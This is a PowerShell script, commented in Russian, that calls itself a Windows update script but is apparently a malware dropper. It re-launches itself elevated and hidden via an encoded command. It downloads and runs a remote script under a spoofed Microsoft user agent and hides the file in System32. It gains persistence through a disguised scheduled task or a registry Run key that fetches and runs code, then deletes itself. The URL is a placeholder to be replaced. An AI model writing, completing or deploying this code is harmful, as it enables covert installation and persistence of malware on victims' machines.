<#
.SYNOPSIS
Системный скрипт обновления Windows
#>

# Проверка прав администратора
function Test-AdminRights {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    catch {
        return $false
    }
}

if (-not (Test-AdminRights)) {
    # Перезапуск с повышенными правами
    $encodedCommand = [Convert]::ToBase64String(
        [Text.Encoding]::Unicode.GetBytes(
            "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
        )
    )
    
    try {
        Start-Process powershell.exe -ArgumentList "-EncodedCommand $encodedCommand" -Verb RunAs -WindowStyle Hidden
    }
    catch {
        # Альтернативный метод
        Start-Process "cmd.exe" -ArgumentList "/c powershell -Command `"Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `\"$PSCommandPath`\"'`"" -WindowStyle Hidden
    }
    exit
}

# Настройки скачивания
$remoteUrl = "https://example.com/path/to/your/script.ps1"  # Замените на реальный URL
$targetPath = "$env:windir\System32\WindowsPowerShell\v1.0\Modules\WindowsUpdate\update.ps1"

# Скачивание скрипта
function Download-Script {
    param (
        [string]$Url,
        [string]$Destination
    )
    
    try {
        # Метод 1 - Invoke-WebRequest
        try {
            Invoke-WebRequest -Uri $Url -OutFile $Destination -UserAgent "Microsoft-Update-Agent" -ErrorAction Stop
            return $true
        }
        catch {
            # Метод 2 - WebClient
            try {
                (New-Object Net.WebClient).DownloadFile($Url, $Destination)
                return $true
            }
            catch {
                # Метод 3 - BITS
                try {
                    Start-BitsTransfer -Source $Url -Destination $Destination -ErrorAction Stop
                    return $true
                }
                catch {
                    return $false
                }
            }
        }
    }
    catch {
        return $false
    }
}

# Создаем директорию если нужно
$dir = Split-Path $targetPath -Parent
if (-not (Test-Path $dir)) {
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
}

# Скачиваем и запускаем скрипт
if (Download-Script -Url $remoteUrl -Destination $targetPath) {
    # Устанавливаем скрытый атрибут
    (Get-Item $targetPath -Force).Attributes += 'Hidden'
    
    # Запускаем скачанный скрипт
    Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$targetPath`"" -WindowStyle Hidden
    
    # Добавляем в автозагрузку
    $taskName = "WindowsSystemMaintenance"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$targetPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
}
else {
    # Резервный метод через реестр
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regValue = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"`$url='$remoteUrl';`$path='$env:TEMP\sysupdate.ps1';try{Invoke-WebRequest -Uri `$url -OutFile `$path}catch{(New-Object Net.WebClient).DownloadFile(`$url,`$path)};& `$path`""
    
    Set-ItemProperty -Path $regPath -Name "WindowsSystemUpdate" -Value $regValue -Force
}

# Самоудаление (опционально)
Start-Sleep -Seconds 5
Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue